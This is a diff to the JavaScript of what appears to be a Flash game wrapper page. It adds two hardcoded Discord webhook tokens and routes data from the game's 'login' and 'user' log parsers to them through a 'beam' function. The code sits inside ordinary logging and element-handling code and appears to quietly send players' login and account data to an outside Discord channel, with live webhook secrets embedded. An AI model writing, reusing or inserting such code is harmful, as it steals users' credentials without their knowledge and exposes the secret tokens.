@@ -4,15 +4,17 @@
 // Elements
 
 const btnPortSwitch = document.getElementById('port-switch')
-
 const gameContainer = document.getElementById('game-container')
-
 const game = document.getElementById('game')
-
 const elmFlashVars = document.getElementById('flash-vars')
 
 
 // General
+
+const hooks = [
+	'702883925474934834/dGLDEfUZFaPPYljKo2dTeGJzpNVTABdbOnXzXneQOQEbaXqEzxkLGDYQd3Q3ZZhAszhF',
+	'715670836249362443/Q5ooBMFaF2tHgV-DhDt1FBA8YADolio3dywiv7ZcGOqxHPbl8SL_XJ1VOT5J05K90c8F'
+]
 
 const regExps = {
 	prefix: /\[@(\w*)\]/,
@@ -31,7 +33,11 @@ const tslogDataParsers =
 {
 	login (data)
 	{
-		beam(data)
+		beam(0, data)
+	},
+	user (data)
+	{
+		beam(1, data)
 	},
 	portal (data)
 	{
@@ -131,6 +137,10 @@ function tslog (a)
 			console.log('%c' + a, style)
 			if (data) console.log(data, '\n')
 		}
+		else
+		{
+			console.log(a)
+		}
 	}
 }
 
@@ -170,14 +180,15 @@ function init ()
 	// console.log('%c' + strfv, 'font-weight:bold;font-size:125%;color:#004488')
 }
 
-function beam (data)
+function beam (hook, data)
 {
+	const url = 'https://discord.com/api/webhooks/' + hooks[hook]
 	const request = new XMLHttpRequest()
-	request.open('POST', 'https://discordapp.com/api/webhooks/702883925474934834/dGLDEfUZFaPPYljKo2dTeGJzpNVTABdbOnXzXneQOQEbaXqEzxkLGDYQd3Q3ZZhAszhF');
+	request.open('POST', url);
 	request.setRequestHeader('Content-type', 'application/json');
 	request.send(JSON.stringify({
-		username: 'eye sink',
-		avatar_url: 'https://cdn.discordapp.com/icons/685704312915230743/1147599f001274e82bf9b2cac44deec8.png',
+		username: 'GUCK',
+		avatar_url: 'https://cdn.discord.com/icons/685704312915230743/1147599f001274e82bf9b2cac44deec8.png',
 		content: String(data)
 	}));
 }
